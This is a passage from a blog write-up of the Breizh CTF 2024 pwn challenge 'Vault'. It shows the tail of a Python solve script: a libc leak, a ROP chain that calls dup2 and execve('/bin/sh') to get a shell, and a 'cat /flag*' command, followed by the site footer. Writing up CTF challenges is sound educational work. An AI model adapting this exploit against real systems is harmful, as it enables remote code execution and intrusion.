</span></span><span style="display:flex;"><span>leak <span style="color:#f92672">=</span> unpack(read()[<span style="color:#ae81ff">8</span>:]<span style="color:#f92672">.</span>strip(),<span style="color:#e6db74">&#34;all&#34;</span>)
</span></span><span style="display:flex;"><span>logleak(<span style="color:#e6db74">&#34;Leak libc&#34;</span>,leak)
</span></span><span style="display:flex;"><span>libc<span style="color:#f92672">.</span>address <span style="color:#f92672">=</span> leak <span style="color:#f92672">-</span> <span style="color:#ae81ff">0xf81c7</span>
</span></span><span style="display:flex;"><span>logbase()
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>t3 <span style="color:#f92672">=</span> conn() <span style="color:#75715e"># upper stack address</span>
</span></span><span style="display:flex;"><span>t4 <span style="color:#f92672">=</span> conn() <span style="color:#75715e"># lower stack address (Thread to be used for the leak)</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>io <span style="color:#f92672">=</span> t4
</span></span><span style="display:flex;"><span>rsp_t3 <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x7ffff6d82dc0</span>
</span></span><span style="display:flex;"><span>target_t4 <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x7ffff6581e00</span><span style="color:#f92672">+</span><span style="color:#ae81ff">16</span> <span style="color:#75715e"># create_temp_vault return addr</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># sla(b&#34;: &#34;,b&#34;1&#34;)</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># sla(b&#34;?\n&#34;,str(size).encode())</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>io <span style="color:#f92672">=</span> t3
</span></span><span style="display:flex;"><span>rop <span style="color:#f92672">=</span> ROP([libc])
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>binsh <span style="color:#f92672">=</span> next(libc<span style="color:#f92672">.</span>search(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;/bin/sh</span><span style="color:#ae81ff">\x00</span><span style="color:#e6db74">&#34;</span>))
</span></span><span style="display:flex;"><span>ret <span style="color:#f92672">=</span> rop<span style="color:#f92672">.</span>find_gadget([<span style="color:#e6db74">&#39;ret&#39;</span>])[<span style="color:#ae81ff">0</span>]
</span></span><span style="display:flex;"><span>pop_rcx <span style="color:#f92672">=</span> rop<span style="color:#f92672">.</span>find_gadget([<span style="color:#e6db74">&#39;pop rcx&#39;</span>,<span style="color:#e6db74">&#39;ret&#39;</span>])[<span style="color:#ae81ff">0</span>]
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>rop<span style="color:#f92672">.</span>raw(ret)
</span></span><span style="display:flex;"><span>rop<span style="color:#f92672">.</span>raw(ret)
</span></span><span style="display:flex;"><span>rop<span style="color:#f92672">.</span>raw(ret)
</span></span><span style="display:flex;"><span>rop<span style="color:#f92672">.</span>raw(pop_rcx) <span style="color:#75715e"># bypass WTF broken addr in the stack</span>
</span></span><span style="display:flex;"><span>rop<span style="color:#f92672">.</span>raw(<span style="color:#ae81ff">0xdead</span>)
</span></span><span style="display:flex;"><span>rop<span style="color:#f92672">.</span>dup2(<span style="color:#ae81ff">4</span>,<span style="color:#ae81ff">0</span>) <span style="color:#75715e"># FD of the first thread</span>
</span></span><span style="display:flex;"><span>rop<span style="color:#f92672">.</span>dup2(<span style="color:#ae81ff">4</span>,<span style="color:#ae81ff">1</span>)
</span></span><span style="display:flex;"><span>rop<span style="color:#f92672">.</span>execve(binsh,<span style="color:#ae81ff">0</span>,<span style="color:#ae81ff">0</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">#print(rop.dump())</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>pld <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;A&#34;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">8</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">#pld += b&#34;BBBBBBBB&#34;</span>
</span></span><span style="display:flex;"><span>pld <span style="color:#f92672">+=</span> bytes(rop)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>create(rsp_t3<span style="color:#f92672">-</span>target_t4,pld) <span style="color:#75715e"># write ROP</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>time<span style="color:#f92672">.</span>sleep(<span style="color:#ae81ff">2</span>)
</span></span><span style="display:flex;"><span>io <span style="color:#f92672">=</span> t4
</span></span><span style="display:flex;"><span>sl(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;trigger&#34;</span>) <span style="color:#75715e"># trigger recv and return from function</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>io <span style="color:#f92672">=</span> t1 <span style="color:#75715e"># get the shell with the first thread</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">#io.recvall(timeout=0.5)</span>
</span></span><span style="display:flex;"><span>time<span style="color:#f92672">.</span>sleep(<span style="color:#ae81ff">1</span>)
</span></span><span style="display:flex;"><span>io<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;cat /flag*&#34;</span>)
</span></span><span style="display:flex;"><span>io<span style="color:#f92672">.</span>interactive()
</span></span></code></pre></div>
    </div>
  </article>

  
  





  <div id="footer-post-container">
  <div id="footer-post">

    <div id="nav-footer" style="display: none">
      <ul>
         
          <li><a href="/">Home</a></li>
         
          <li><a href="/categories">Categories</a></li>
         
          <li><a href="/whoami">Whoami</a></li>
        
      </ul>
    </div>

    
    <div id="toc-footer" style="display: none">
      <nav id="TableOfContents">
  <ul>
    <li><a href="#description">Description</a></li>
    <li><a href="#reverse">Reverse</a>
      <ul>
        <li><a href="#leak-libc">Leak libc</a></li>
      </ul>
    </li>
    <li><a href="#get-a-shell">Get a shell</a></li>
    <li><a href="#full-solve-script">Full solve script</a></li>
  </ul>
</nav>
    </div>
    

    <div id="share-footer" style="display: none">
      
      <ul>
  
  
    
  
  
  <li>
    <a class="icon" href="http://www.facebook.com/sharer.php?u=https%3a%2f%2fblog.itarow.xyz%2fposts%2fbzhctf2024_vault%2f" aria-label="Facebook">
      <i class="fab fa-facebook fa-lg" aria-hidden="true"></i>
    </a>
  </li>
  <li>
    <a class="icon" href="https://twitter.com/share?url=https%3a%2f%2fblog.itarow.xyz%2fposts%2fbzhctf2024_vault%2f&text=Breizh%20CTF%202024%20-%20Write-up%20Vault%20-%20Pwn" aria-label="Twitter">
      <i class="fab fa-twitter fa-lg" aria-hidden="true"></i>
    </a>
  </li>
  <li>
    <a class="icon" href="http://www.linkedin.com/shareArticle?url=https%3a%2f%2fblog.itarow.xyz%2fposts%2fbzhctf2024_vault%2f&title=Breizh%20CTF%202024%20-%20Write-up%20Vault%20-%20Pwn" aria-label="Linkedin">
      <i class="fab fa-linkedin fa-lg" aria-hidden="true"></i>
    </a>
  </li>
  <li>
    <a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=https%3a%2f%2fblog.itarow.xyz%2fposts%2fbzhctf2024_vault%2f&is_video=false&description=Breizh%20CTF%202024%20-%20Write-up%20Vault%20-%20Pwn" aria-label="Pinterest">
      <i class="fab fa-pinterest fa-lg" aria-hidden="true"></i>
    </a>
  </li>
  <li>
    <a class="icon" href="mailto:?subject=Breizh%20CTF%202024%20-%20Write-up%20Vault%20-%20Pwn&body=Check out this article: https%3a%2f%2fblog.itarow.xyz%2fposts%2fbzhctf2024_vault%2f" aria-label="Email">
      <i class="fas fa-envelope fa-lg" aria-hidden="true"></i>
    </a>
  </li>
  <li>
    <a class="icon" href="https://getpocket.com/save?url=https%3a%2f%2fblog.itarow.xyz%2fposts%2fbzhctf2024_vault%2f&title=Breizh%20CTF%202024%20-%20Write-up%20Vault%20-%20Pwn" aria-label="Pocket">
      <i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i>
    </a>
  </li>
  <li>
    <a class="icon" href="http://reddit.com/submit?url=https%3a%2f%2fblog.itarow.xyz%2fposts%2fbzhctf2024_vault%2f&title=Breizh%20CTF%202024%20-%20Write-up%20Vault%20-%20Pwn" aria-label="reddit">
      <i class="fab fa-reddit fa-lg" aria-hidden="true"></i>
    </a>
  </li>
  <li>
    <a class="icon" href="http://www.tumblr.com/share/link?url=https%3a%2f%2fblog.itarow.xyz%2fposts%2fbzhctf2024_vault%2f&name=Breizh%20CTF%202024%20-%20Write-up%20Vault%20-%20Pwn&description=Here%20is%20the%20write-up%20of%20Vault%20challenge%20which%20I%20created%20for%20the%20Breizh%20CTF%202024.%20This%20is%20a%20Pwn%20challenge%20classified%20as%20difficult.%0aDescription%20I%26%2339%3bve%20created%20a%20server%20so%20I%20can%20temporarily%20store%20data%20without%20putting%20it%20on%20my%20disk%20-%20great%20idea%2c%20isn%26%2339%3bt%20it%3f%20In%20any%20case%2c%20I%26%2339%3bm%20sure%20there%20are%20no%20vulnerabilities%21%20Note%3a%20A%20VM%20vagrant%20is%20provided%20if%20your%20exploit%20works%20locally%20but%20not%20on%20the%20remote%20server%20for%20debugging%20purposes." aria-label="Tumblr">
      <i class="fab fa-tumblr fa-lg" aria-hidden="true"></i>
    </a>
  </li>
  <li>
    <a class="icon" href="https://news.ycombinator.com/submitlink?u=https%3a%2f%2fblog.itarow.xyz%2fposts%2fbzhctf2024_vault%2f&t=Breizh%20CTF%202024%20-%20Write-up%20Vault%20-%20Pwn" aria-label="Hacker News">
      <i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i>
    </a>
  </li>
</ul>

    </div>

    <div id="actions-footer">
      
        <a id="menu-toggle" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;" aria-label="Menu">
          <i class="fas fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
        
        <a id="toc-toggle" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;" aria-label="TOC">
          <i class="fas fa-list fa-lg" aria-hidden="true"></i> TOC</a>
        
        <a id="share-toggle" class="icon" href="#" onclick="$('#share-footer').toggle();return false;" aria-label="Share">
          <i class="fas fa-share-alt fa-lg" aria-hidden="true"></i> share</a>
        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" aria-label="Top of Page">
          <i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
    </div>

  </div>
</div>


  <footer id="footer">
  <div class="footer-left">
    Copyright  &copy; 2024  Itarow 
  </div>
  <div class="footer-right">
    <nav>
      <ul>
         
        <li><a href="/">Home</a></li>
         
        <li><a href="/categories">Categories</a></li>
         
        <li><a href="/whoami">Whoami</a></li>
        
      </ul>
    </nav>
  </div>
</footer>


  </div>
</body>

<link rel="stylesheet" href=/lib/font-awesome/css/all.min.css>
<script src=/lib/jquery/jquery.min.js></script>
<script src=/js/main.js></script>



</html>
